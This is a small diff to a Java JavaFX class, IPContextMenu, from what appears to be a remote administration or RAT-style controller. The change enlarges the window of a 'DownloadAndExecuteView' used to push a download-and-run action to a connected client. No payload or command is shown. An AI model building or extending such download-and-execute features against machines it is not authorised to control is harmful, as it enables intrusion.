@@ -90,7 +90,7 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinWidth(300);
             stage.setMinWidth(300);
-            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 225));
+            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 250));
             stage.show();
             DownloadAndExecuteView.getDownloadButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
